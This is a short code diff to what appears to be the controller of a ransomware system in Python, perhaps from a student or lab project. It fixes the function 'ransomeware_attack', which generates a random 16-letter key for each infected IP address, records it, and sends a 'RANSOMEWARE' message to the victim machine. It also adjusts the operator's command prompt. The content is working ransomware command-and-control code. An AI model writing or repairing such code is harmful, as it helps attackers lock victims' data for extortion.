@@ -1,5 +1,7 @@
 import socket
 import os
+import random
+import string
 from messenger import *
 from threading import Thread
 from time import sleep
@@ -22,7 +24,7 @@ def ransomeware_attack(payload):
     infected_ip = str(payload.split(",")[1])
     if infected_ip in keys:
         return # already attacked
-    key = ''.join(random.choices(string.ascii_lowercase, n=16))
+    key = ''.join(random.choice(string.ascii_lowercase) for _ in range(16))
     keys[infected_ip] = key
     msg_contents = "RANSOMEWARE," + key
     Messenger.send_message(infected_ip, VICTIM_PORT, msg_contents)
@@ -93,7 +95,7 @@ def main():
     listen_thread.start()
 
     while True:
-        command = str(raw_input("Enter a command to run: ")).strip()
+        command = str(raw_input("Enter a command to run: ")).replace(" ", "")
         try:
             if len(command) == 4:
                 # Either a LIST or EXIT command
